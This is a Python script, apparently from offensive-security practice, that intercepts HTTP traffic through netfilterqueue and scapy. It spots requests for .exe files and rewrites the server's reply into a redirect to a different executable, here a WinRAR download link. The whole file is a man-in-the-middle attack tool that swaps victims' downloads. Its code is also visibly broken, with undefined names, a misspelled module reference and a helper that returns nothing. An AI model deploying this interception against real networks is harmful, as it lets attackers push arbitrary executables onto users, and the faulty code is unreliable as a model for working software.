#!/usr/bin/env python

import netfilterqueue 
import scapy.all as scapy


ack_list = []

def set_load(packet,load):  
         scapy_packet[scapy.Raw].load = load
         del scapy_packet[Scapy.IP].len
         del scapy_packet[Scapy.IP].chksum
         del scapy_packet[Scapy.TCP].chksum

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw): 
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list : 
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently \nLocation: https://www.rarlab.com/rar/wrar571ar.exe\n\n")
                packet.set_payload(str(scapy_packet))
    packet.accept()



queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

